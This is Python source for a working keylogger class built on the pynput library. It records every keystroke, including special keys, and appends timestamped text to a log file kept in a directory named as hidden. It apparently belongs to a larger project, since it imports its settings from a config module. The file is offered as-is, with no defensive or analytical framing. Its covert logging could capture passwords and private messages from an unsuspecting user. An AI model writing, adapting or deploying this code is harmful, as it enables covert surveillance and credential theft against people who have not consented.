from pynput import keyboard
import threading
import time
from datetime import datetime
import os
from config import LOG_FILE, HIDDEN_DIR

class Keylogger:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()
        self.log_path = os.path.join(HIDDEN_DIR, LOG_FILE)
        self.running = True

    def _timestamp(self):
        return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

    def write_to_log(self, text, timestamp=True):
        with open(self.log_path, 'a', encoding='utf-8') as f:
            if timestamp:
                f.write(f"{self._timestamp()} {text}")
            else:
                f.write(text)

    def flush_buffer(self):
        if self.buffer:
            word = ''.join(self.buffer)
            self.write_to_log(word)
            self.buffer.clear()

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                with self.lock:
                    self.buffer.append(key.char)
            else:
                self.handle_special_key(key)
        except Exception as e:
            print(f"Key error: {e}")

    def handle_special_key(self, key):
        with self.lock:
            if key == keyboard.Key.space:
                self.buffer.append(' ')
            elif key == keyboard.Key.enter:
                self.flush_buffer()
                self.write_to_log('\n')
            elif key == keyboard.Key.backspace:
                if self.buffer:
                    self.buffer.pop()
            elif key == keyboard.Key.tab:
                self.buffer.append('\t')
            else:
                self.buffer.append(f'[{key}]')

    def start(self):
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        with keyboard.Listener(on_press=self.on_press) as listener:
            while self.running:
                time.sleep(0.1)
            listener.stop()

    def stop(self):
        self.running = False
        self.flush_buffer()